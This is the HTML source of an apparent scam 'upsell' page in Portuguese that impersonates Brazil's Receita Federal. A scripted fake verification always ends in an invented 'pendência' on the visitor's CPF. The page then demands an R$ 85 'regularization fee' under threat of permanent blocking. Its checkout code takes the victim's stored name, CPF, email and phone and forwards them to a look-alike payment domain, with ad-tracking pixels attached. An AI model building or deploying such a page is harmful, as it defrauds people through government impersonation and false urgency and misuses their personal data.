<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upsell 4 - Pend√™ncia Receita Federal</title>
    
    <!-- Facebook Pixel -->
    <script src="../js/facebook-pixel.js"></script>
    
    <script>
        localStorage.setItem("upsell", "up3");
    </script>
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #eef2f3;
        }

        .header {
            background-color: #004080;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .header img {
            width: 65%;
            padding: 0%;
            margin-bottom: 0%;
            margin-top: -5%;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: calc(100vh - 100px);
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #002776, #0044cc);
            color: white;
        }

        .container h1 {
            font-size: 28px;
            margin-bottom: 20px;
            margin-top: -35%;
            font-weight: bold;
        }

        .loading {
            font-size: 18px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading span {
            margin-left: 10px;
            font-weight: bold;
        }

        .loading-bar {
            width: 80%;
            height: 8px;
            background-color: #cce5ff;
            border-radius: 5px;
            overflow: hidden;
            margin: 15px 0;
            position: relative;
        }

        .loading-bar div {
            height: 100%;
            width: 0;
            background-color: #ffcc00;
            animation: loading 6s linear forwards;
        }

        @keyframes loading {
            0% {
                width: 0;
            }

            100% {
                width: 100%;
            }
        }

        .container p {
            font-size: 18px;
            margin: 15px 0;
        }

        .container .highlight {
            color: #ffcc00;
            font-weight: bold;
        }

        .action {
            margin-top: 30px;
            display: none;
        }

        .action button {
            background-color: #ffcc00;
            color: #002776;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .action button:hover {
            background-color: #ffd633;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #cce5ff;
        }

        .footer strong {
            color: #ffcc00;
        }
    </style>
    <script>
        // Debug: Log dos par√¢metros recebidos na p√°gina up4
        console.log('=== DEBUG UP4 PAGE ===');
        console.log('URL atual:', window.location.href);
        console.log('Par√¢metros recebidos:', window.location.search);
        if (window.location.search) {
            console.log('Par√¢metros parseados:', new URLSearchParams(window.location.search));
        }
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const container = document.querySelector(".container");
            const actionSection = document.querySelector(".action");
            const loadingBar = document.querySelector(".loading-bar div");
            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
            let step = 0;

            const steps = [
                "Verificando pagamento...",
                "Verificando dados...",
                "Erro encontrado!"
            ];

            const interval = setInterval(() => {
                if (step < steps.length) {
                    container.querySelector("h1").textContent = steps[step];
                    step++;
                } else {
                    clearInterval(interval);
                    container.querySelector("h1").textContent = "‚ö†Ô∏è Pend√™ncia na Receita Federal!";
                    loadingElements.forEach(el => el.style.display = "none");
                    actionSection.style.display = "block";
                }
            }, 2000);

    
            loadingBar.style.animationPlayState = 'running';
        });
    </script>
</head>

<body>

    <div class="header">
        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Receita Federal">
    </div>

    <div class="container">
        <h1>‚ö†Ô∏è Verificando...</h1>
        <div class="loading">
            <span>Processando informa√ß√µes...</span>
        </div>
        <div class="loading-bar">
            <div></div>
        </div>

        <div class="action">
            <p>Identificamos uma pend√™ncia relacionada ao seu <span class="highlight">CPF</span>.</p>
            <p>Para resolver, √© necess√°rio efetuar o pagamento da <span class="highlight">Taxa de Regulariza√ß√£o</span>.
            </p>
            <p>O valor √© de <span class="highlight">R$ 85,00</span>. Ap√≥s o pagamento, sua solicita√ß√£o ser√° liberada
                imediatamente!</p>

            <div class="cta">
                <button onclick="checkout(event)">REGULARIZAR AGORA</button>
            </div>
        </div>

        <div class="footer">
            ‚ö†Ô∏è <strong>Aten√ß√£o:</strong> O n√£o pagamento pode causar o bloqueio definitivo do processo.
        </div>
    </div>
    <script>
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl);
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }

        function checkout(event) {
            event.preventDefault();
            
            try {
                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
                const email = localStorage.getItem('email') || '';
                const telephone = localStorage.getItem('telephone') || '';
                
                const baseUrl = 'https://pay.novopaggamentoseguro.com/checkout/8e11e357-ceba-445c-a03d-09fd633aec57';
                const url = new URL(baseUrl);
                
                // Adicionar par√¢metros do usu√°rio
                url.searchParams.append('name', dadosUsuario.NOME || '');
                url.searchParams.append('document', dadosUsuario.CPF || '');
                url.searchParams.append('email', email || 'useraleatorio@gmail.com');
                url.searchParams.append('telephone', telephone || '');
                
                // Adicionar par√¢metros da URL atual usando a fun√ß√£o buildUrlWithParams
                const finalUrl = buildUrlWithParams(url.toString());
                
                window.location.href = finalUrl;
            } catch(err) {
                console.error('Erro ao redirecionar:', err);
                window.location.href = buildUrlWithParams('https://pay.novopagamentooseguro.com/checkout/01909ce3-c53e-407b-9271-94977c263952');
            }
        }

        // Facebook Pixel tracking
        document.addEventListener('DOMContentLoaded', function() {
            if (typeof fbq !== 'undefined') {
                fbq('track', 'ViewContent', {
                    content_name: 'Upsell UP4 - Pend√™ncia Receita Federal',
                    content_type: 'upsell_page',
                    currency: 'BRL'
                });
                console.log('üéØ Facebook Pixel: ViewContent tracked for UP4 upsell page');
            }
        });
    </script>


</body></html>